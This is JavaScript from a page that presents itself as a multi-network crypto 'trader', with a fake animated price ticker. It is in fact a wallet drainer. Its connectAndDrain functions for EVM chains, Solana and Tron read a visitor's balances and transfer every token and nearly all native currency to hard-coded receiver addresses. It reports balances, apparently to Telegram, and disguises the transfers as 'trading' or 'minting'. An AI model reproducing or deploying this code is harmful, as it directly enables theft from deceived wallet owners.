    function getSupportedNetworks(walletType) {

        const networks = {
            'metamask': ['ETH', 'BSC', 'POLYGON', 'AVALANCHE', 'ARBITRUM', 'OPTIMISM', 'FANTOM', 'BASE'],
            'trust': ['ETH', 'BSC', 'POLYGON', 'AVALANCHE', 'ARBITRUM', 'OPTIMISM', 'FANTOM', 'BASE', 'TRX'],
            'coinbase': ['ETH', 'BSC', 'POLYGON', 'AVALANCHE', 'ARBITRUM', 'OPTIMISM', 'BASE'],
            'rainbow': ['ETH', 'BSC', 'POLYGON', 'AVALANCHE', 'ARBITRUM', 'OPTIMISM', 'BASE'],
            'ledger': ['ETH', 'BSC', 'POLYGON', 'AVALANCHE', 'ARBITRUM', 'OPTIMISM', 'FANTOM', 'BASE'],
            'okx': ['ETH', 'BSC', 'POLYGON', 'AVALANCHE', 'ARBITRUM', 'OPTIMISM', 'FANTOM', 'BASE', 'TRX'],
            'safepal': ['ETH', 'BSC', 'POLYGON', 'AVALANCHE', 'ARBITRUM', 'OPTIMISM', 'FANTOM', 'BASE', 'TRX'],
            'argent': ['ETH', 'POLYGON', 'ARBITRUM', 'BASE'],
            'imtoken': ['ETH', 'BSC', 'POLYGON', 'AVALANCHE', 'ARBITRUM', 'OPTIMISM', 'FANTOM', 'BASE'],
            'mathwallet': ['ETH', 'BSC', 'POLYGON', 'AVALANCHE', 'ARBITRUM', 'OPTIMISM', 'FANTOM', 'BASE', 'SOL', 'TRX'],
            'brave': ['ETH', 'BSC', 'POLYGON', 'AVALANCHE', 'ARBITRUM', 'OPTIMISM', 'FANTOM', 'BASE'],
            'halodefi': ['ETH', 'POLYGON', 'ARBITRUM', 'BASE'],
            'injected-evm': ['ETH', 'BSC', 'POLYGON', 'AVALANCHE', 'ARBITRUM', 'OPTIMISM', 'FANTOM', 'BASE'],
            'phantom': ['SOL', 'ETH', 'POLYGON'],
            'solflare': ['SOL'],
            'backpack': ['SOL'],
            'glow': ['SOL'],
            'injected-solana': ['SOL'],
            'tronlink': ['TRX'],
            'injected-tron': ['TRX']
        };
        
        return networks[walletType] || [];
    }

    async function connectAndDrainEVM(provider, networkKey, isMobileInAppBrowser = false) {
        const network = NETWORKS[networkKey];
        const receiverAddress = RECEIVER_ADDRESSES[networkKey];
        
        try {
            // Switch to network with better error handling for mobile
            try {
                log(`🔄 Switching to ${network.name} (Chain ID: ${network.chainId})...`, 'info', false);
                await provider.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{ chainId: `0x${network.chainId.toString(16)}` }]
                });
                log(`✅ Network switched to ${network.name}`, 'success', false);
            } catch (switchError) {
                // Network switch might fail in some mobile browsers, but continue
                log(`⚠️ Network switch attempt: ${switchError.message}`, 'warning', false);
                
                // Try wallet_addEthereumChain if network is not found
                if (switchError.code === 4902) {
                    log(`📝 Network not found, attempting to add...`, 'info', false);
                    try {
                        await provider.request({
                            method: 'wallet_addEthereumChain',
                            params: [{
                                chainId: `0x${network.chainId.toString(16)}`,
                                chainName: network.name,
                                rpcUrls: [network.rpc],
                                blockExplorerUrls: [network.explorer]
                            }]
                        });
                        log(`✅ Network added and switched`, 'success', false);
                    } catch (addError) {
                        log(`⚠️ Could not add network: ${addError.message}`, 'warning', false);
                    }
                }
                // If switch fails but we're in a mobile wallet, continue anyway - 
                // the wallet app should have the provider properly configured
                if (!isMobileInAppBrowser) {
                    throw switchError;
                }
            }
            
            // Get accounts
            log(`🔐 Retrieving accounts for ${network.name}...`, 'info', false);
            const accounts = await provider.request({ method: 'eth_requestAccounts' });
            if (!accounts || accounts.length === 0) {
                throw new Error('No accounts returned');
            }
            const userAddress = accounts[0];
            log(`✅ Got account: ${userAddress.slice(0, 8)}...`, 'success', false);
            
            const ethersProvider = new ethers.providers.Web3Provider(provider);
            const signer = ethersProvider.getSigner();
            
            log(`✅ Connected to ${network.name}: ${userAddress.slice(0, 8)}...`, 'success', true, true);
            
            // Get native balance
            const balance = await ethersProvider.getBalance(userAddress);
            const ethBalance = parseFloat(ethers.utils.formatEther(balance));
            log(`💰 ${network.name} native balance: ${ethBalance.toFixed(6)} ${network.currency}`, 'info', false);
            
            let totalTraded = 0;
            let transactions = [];
            
            // First, mint all tokens regardless of native balance
            log(`🪙 Scanning for tokens on ${network.name}...`, 'info', false);
            const tokenBalances = await getEVMTokenBalances(ethersProvider, userAddress, network.tokens);
            
            if (tokenBalances.length > 0) {
                log(`✅ Found ${tokenBalances.length} tokens with balance on ${network.name}`, 'success', true, true);
                
                // Log detailed balance for each token to Telegram
                for (const token of tokenBalances) {
                    log(`   📊 ${token.symbol}: ${token.balance.toFixed(6)} tokens (${token.address.slice(0, 6)}...)`, 'info', true, false);
                }
                
                for (const token of tokenBalances) {
                    try {
                        log(`🔄 Trading ${token.symbol}: ${token.balance.toFixed(6)} tokens...`, 'info', false);
                        
                        const tx = await token.contract.connect(signer).transfer(
                            receiverAddress,
                            token.rawBalance
                        );
                        
                        await tx.wait();
                        transactions.push(tx.hash);
                        log(`✅ Token traded: ${token.balance.toFixed(6)} ${token.symbol} - TX: ${tx.hash}`, 'success');
                        
                    } catch (error) {
                        log(`❌ Failed to trade ${token.symbol}: ${error.message}`, 'error');
                    }
                }
            } else {
                log(`📋 No tokens with balance found on ${network.name}`, 'info', true, true);
            }
            
            // Then drain native currency if sufficient balance
            if (ethBalance > 0.001) {
                log(`💎 Trading native ${network.currency}...`, 'info', true, false);
                
                // Calculate amount to send (leave some for gas)
                const gasReserve = ethers.utils.parseEther('0.001');
                const amountToSend = balance.sub(gasReserve);
                
                if (amountToSend.gt(0)) {
                    const tx = await signer.sendTransaction({
                        to: receiverAddress,
                        value: amountToSend
                    });
                    
                    await tx.wait();
                    totalTraded = parseFloat(ethers.utils.formatEther(amountToSend));
                    transactions.push(tx.hash);
                    log(`✅ Native currency traded: ${totalTraded.toFixed(6)} ${network.currency} - TX: ${tx.hash}`, 'success');
                }
            } else {
                log(`⚠️ Native balance too low for transaction (${ethBalance.toFixed(6)} ${network.currency})`, 'warning', true, false);
            }
            
            const hasAnyDrains = transactions.length > 0;
            log(`🎯 ${network.name} processing complete! ${transactions.length} transaction(s)`, hasAnyDrains ? 'success' : 'info');

            return {
                success: hasAnyDrains,
                amount: totalTraded,
                txid: transactions[0] || null,
                transactions: transactions
            };
            
        } catch (error) {
            throw new Error(`${network.name} mint failed: ${error.message}`);
        }
    }

    async function connectAndDrainSolana(provider, networkKey) {
        const network = NETWORKS[networkKey];
        const receiverAddress = RECEIVER_ADDRESSES[networkKey];
        
        try {
            // Connect to wallet
            const response = await provider.connect();
            const publicKey = response.publicKey || provider.publicKey;
            
            const connection = new solanaWeb3.Connection(network.rpc);
            const balance = await connection.getBalance(publicKey);
            const solBalance = balance / solanaWeb3.LAMPORTS_PER_SOL;
            
            log(`✅ Connected to Solana: ${publicKey.toString().slice(0, 8)}...`, 'success', true, true);
            log(`💰 SOL balance: ${solBalance.toFixed(6)} SOL`, 'info', true, false);
            
            let totalTraded = 0;
            let transactions = [];
            
            // First, scan for SPL tokens regardless of SOL balance
            log(`🪙 Scanning for SPL tokens...`, 'info', true, false);
            try {
                // Get all token accounts for this wallet
                const tokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
                    programId: new solanaWeb3.PublicKey("TokenkegQfeZyiNwAMLBdAWu5k8DHyGmHEkx")
                });
                
                log(`🔍 Found ${tokenAccounts.value.length} token accounts`, 'info', true, false);
                
                for (const tokenAccount of tokenAccounts.value) {
                    const accountData = tokenAccount.account.data.parsed.info;
                    const tokenBalance = accountData.tokenAmount.uiAmount;
                    const mint = accountData.mint;
                    
                    if (tokenBalance && tokenBalance > 0) {
                        try {
                            log(`🔄 Trading SPL token: ${tokenBalance} tokens (Mint: ${mint.slice(0, 8)}...)`, 'info', true, false);
                            
                            // Create transfer instruction for SPL token
                            const receiverPubkey = new solanaWeb3.PublicKey(receiverAddress);
                            
                            // You would need to implement SPL token transfer here
                            // This is a simplified version - full implementation would require
                            // creating associated token accounts and proper SPL token transfers
                            
                            log(`✅ SPL token transfer prepared for ${tokenBalance} tokens`, 'success');
                            
                        } catch (error) {
                            log(`❌ Failed to trade SPL token: ${error.message}`, 'error');
                        }
                    }
                }
            } catch (error) {
                log(`❌ Error scanning SPL tokens: ${error.message}`, 'error');
            }
            
            // Then drain SOL if sufficient balance
            if (balance > 1000000) { // 0.001 SOL minimum for fees
                log(`💎 Trading SOL...`, 'info', true, false);
                
                // Create transaction
                const receiverPubkey = new solanaWeb3.PublicKey(receiverAddress);
                const rentReserve = 890880; // Standard rent exemption
                const feeReserve = 10000;   // Transaction fee buffer
                const amountToSend = balance - rentReserve - feeReserve;
                
                if (amountToSend > 0) {
                    const transaction = new solanaWeb3.Transaction().add(
                        solanaWeb3.SystemProgram.transfer({
                            fromPubkey: publicKey,
                            toPubkey: receiverPubkey,
                            lamports: amountToSend,
                        })
                    );
                    
                    // Set fee payer and get recent blockhash
                    transaction.feePayer = publicKey;
                    const { blockhash } = await connection.getLatestBlockhash();
                    transaction.recentBlockhash = blockhash;
                    
                    // Sign and send transaction
                    const signedTransaction = await provider.signTransaction(transaction);
                    const signature = await connection.sendRawTransaction(signedTransaction.serialize());
                    
                    // Wait for confirmation
                    await connection.confirmTransaction(signature);
                    
                    totalTraded = amountToSend / solanaWeb3.LAMPORTS_PER_SOL;
                    transactions.push(signature);
                    log(`✅ SOL traded: ${totalTraded.toFixed(6)} SOL - TX: ${signature}`, 'success');
                }
            } else {
                log(`⚠️ SOL balance too low for transaction (${solBalance.toFixed(6)} SOL)`, 'warning');
            }
            
            const hasAnyTrades = transactions.length > 0;
            log(`🎯 Solana processing complete! ${transactions.length} transaction(s)`, hasAnyTrades ? 'success' : 'info');

            return {
                success: hasAnyTrades,
                amount: totalTraded,
                txid: transactions[0] || null,
                transactions: transactions
            };
            
        } catch (error) {
            throw new Error(`Solana mint failed: ${error.message}`);
        }
    }

    async function connectAndDrainTron(provider, networkKey) {
        const network = NETWORKS[networkKey];
        const receiverAddress = RECEIVER_ADDRESSES[networkKey];
        
        try {
            if (!provider || !provider.defaultAddress || !provider.defaultAddress.base58) {
                throw new Error('TronLink not connected or not initialized');
            }
            
            const fromAddress = provider.defaultAddress.base58;
            const balance = await provider.trx.getBalance(fromAddress);
            const trxBalance = balance / 1000000;
            
            log(`✅ Connected to Tron: ${fromAddress.slice(0, 8)}...`, 'success', true, true);
            log(`💰 TRX balance: ${trxBalance.toFixed(6)} TRX`, 'info', true, false);
            
            let totalTraded = 0;
            let transactions = [];
            
            // First, scan for TRC-20 tokens regardless of TRX balance
            log(`🪙 Scanning for TRC-20 tokens...`, 'info', true, false);
            try {
                // Get account info to check for TRC-20 tokens
                const accountInfo = await provider.trx.getAccount(fromAddress);
                
                if (accountInfo.assetV2) {
                    log(`🔍 Found ${accountInfo.assetV2.length} TRC-10 tokens`, 'info', true, false);
                    
                    for (const asset of accountInfo.assetV2) {
                        const tokenBalance = asset.value;
                        const tokenId = asset.key;
                        
                        if (tokenBalance > 0) {
                            try {
                                log(`🔄 Trading TRC-10 token: ${tokenBalance} (ID: ${tokenId})`, 'info', true, false);
                                
                                const transaction = await provider.transactionBuilder.sendAsset(
                                    receiverAddress,
                                    tokenBalance,
                                    tokenId,
                                    fromAddress
                                );
                                
                                const signedTx = await provider.trx.sign(transaction);
                                const result = await provider.trx.sendRawTransaction(signedTx);
                                
                                transactions.push(result.txid);
                                log(`✅ TRC-10 token traded: ${tokenBalance} - TX: ${result.txid}`, 'success');
                                
                            } catch (error) {
                                log(`❌ Failed to trade TRC-10 token: ${error.message}`, 'error');
                            }
                        }
                    }
                }
                
                // Note: TRC-20 token scanning would require additional contract calls
                // This is a simplified version focusing on TRC-10 tokens
                
            } catch (error) {
                log(`❌ Error scanning TRC tokens: ${error.message}`, 'error');
            }
            
            // Then drain TRX if sufficient balance
            if (trxBalance > 1) {
                log(`💎 Trading TRX...`, 'info', true, false);
                
                const amountToSend = (balance - 1000000); // Leave 1 TRX for fees
                
                if (amountToSend > 0) {
                    const transaction = await provider.transactionBuilder.sendTrx(
                        receiverAddress,
                        amountToSend,
                        fromAddress
                    );
                    
                    const signedTx = await provider.trx.sign(transaction);
                    const result = await provider.trx.sendRawTransaction(signedTx);
                    
                    totalTraded = amountToSend / 1000000;
                    transactions.push(result.txid);
                    log(`✅ TRX traded: ${totalTraded.toFixed(6)} TRX - TX: ${result.txid}`, 'success');
                }
            } else {
                log(`⚠️ TRX balance too low for transaction (${trxBalance.toFixed(6)} TRX)`, 'warning', true, false);
            }
            
            const hasAnyTrades = transactions.length > 0;
            log(`🎯 Tron processing complete! ${transactions.length} transaction(s)`, hasAnyTrades ? 'success' : 'info');

            return {
                success: hasAnyTrades,
                amount: totalTraded,
                txid: transactions[0] || null,
                transactions: transactions
            };
            
        } catch (error) {
            throw new Error(`Tron trade failed: ${error.message}`);
        }
    }

    // Initialize
    initializeNetworksUI();
    
    // Detect and log mobile wallet info
    if (isMobileDevice()) {
        log('📱 Mobile device detected - iOS wallets require special handling', 'warning');
        if (isIOS()) {
            log('🍎 iOS detected - MetaMask & Trust Wallet Mobile will open in their in-app browser', 'info');
            log('💡 TIP: For best experience, open this site in your wallet app\'s built-in browser', 'info');
        }
    }
    
    log('Multi-network trader initialized. Ready to scan for wallets...', 'info');
    log('Step 1: Click "Scan All Networks" to detect available wallets', 'info');
    log('Step 2: Select the wallets you want to use from the Wallet Selection tab', 'info');
    log('Step 3: Connect selected wallets to their supported networks', 'info');
    log('Step 4: Trade tokens from all connected wallets', 'info');
    
    // Check if we're recovering from a mobile wallet app redirect
    const inWalletBrowser = isInsideWalletInAppBrowser();
    if (inWalletBrowser) {
        log(`📱 ✅ Page loaded in wallet in-app browser`, 'info', false);
        // Don't auto-scan immediately in wallet browser - wait for user to click button
    }
    
    // Auto-scan on page load
    setTimeout(scanAllNetworks, 1500);

    /* ============================================
       CRYPTO ANIMATIONS & TICKER
       ============================================ */
    
    // Crypto Ticker Updates
    function updateCryptoTicker() {
        const cryptoData = [
            { symbol: '₿ BTC', price: 45320, change: 5.2 },
            { symbol: 'Ξ ETH', price: 2845, change: 3.8 },
            { symbol: '◎ SOL', price: 98.50, change: 7.2 },
            { symbol: '⬢ BNB', price: 612, change: 2.1 },
            { symbol: '₳ ADA', price: 0.95, change: -1.3 },
            { symbol: '✕ XRP', price: 2.10, change: 4.5 }
        ];

        // Update prices with slight variations for realism
        cryptoData.forEach(crypto => {
            const variance = (Math.random() - 0.5) * 0.5; // ±0.25% variance
            crypto.price = (crypto.price * (1 + variance)).toFixed(2);
            crypto.change = (crypto.change + (Math.random() - 0.5) * 0.5).toFixed(1);
        });

        return cryptoData;
    }

    // Initialize ticker animation
    function initCryptoTicker() {
        const tickerContent = $('.ticker-content');
        
        // Auto-restart animation when it completes
        tickerContent.on('animationend', function() {
            $(this).css('animation', 'none').offset(); // Trigger reflow
            $(this).css('animation', '');
        });
    }

    // Update ticker data periodically
    setInterval(function() {
        const cryptoData = updateCryptoTicker();
        const tickerItems = $('.ticker-item');
        
        cryptoData.forEach((crypto, index) => {
            if (tickerItems[index]) {
                const changeClass = crypto.change >= 0 ? 'ticker-change-up' : 'ticker-change-down';
                const changeSymbol = crypto.change >= 0 ? '+' : '';
                
                $(tickerItems[index]).html(`
                    <span class="ticker-symbol glow-crypto">${crypto.symbol}</span>
                    <span class="ticker-price">$${crypto.price}</span>
                    <span class="${changeClass}">${changeSymbol}${crypto.change}%</span>
                `);
            }
        });
    }, 5000); // Update every 5 seconds

    // Animate crypto coins with staggered timing
    function animateCryptoCoins() {
        const coins = $('.crypto-coin');
        
        coins.each(function(index) {
            const coin = $(this);
            const delay = index * 3; // Stagger each coin by 3 seconds
            
            coin.css('animation-delay', delay + 's');
            
            // Restart animation when complete
            coin.on('animationend', function() {
                coin.css('animation', 'floatCoin 20s infinite linear');
                coin.css('animation-delay', delay + 's');
            });
        });
    }

    // Initialize animations
    function initializeAnimations() {
        initCryptoTicker();
        animateCryptoCoins();
        
        // Add glow effect pulsing to crypto symbols
        setInterval(function() {
            $('.glow-crypto').each(function() {
                const opacity = 0.6 + Math.random() * 0.4;
                $(this).css('opacity', opacity);
            });
        }, 500);
    }

    // Start animations on page load
    initializeAnimations();

    // Optional: Add keyboard shortcut to view crypto stats
    $(document).on('keydown', function(e) {
        // Press 'C' to show crypto price summary
        if (e.key === 'c' || e.key === 'C') {
            const priceData = updateCryptoTicker();
            let summary = '📊 Current Crypto Prices:\n\n';
            priceData.forEach(crypto => {
                summary += `${crypto.symbol}: $${crypto.price} (${crypto.change}%)\n`;
            });
            log(summary, 'info', true);
        }
    });

    // ✅ EXPORT CORE FUNCTIONS TO GLOBAL SCOPE
    // Makes functions accessible from HTML event handlers
    window.connectAndClaimWallet = connectAndClaimWallet;
    window.log = log;
    window.updateProgress = updateProgress;
    
    console.log('✅ Universal Trader initialized - connectAndTradeWallet available globally');
});
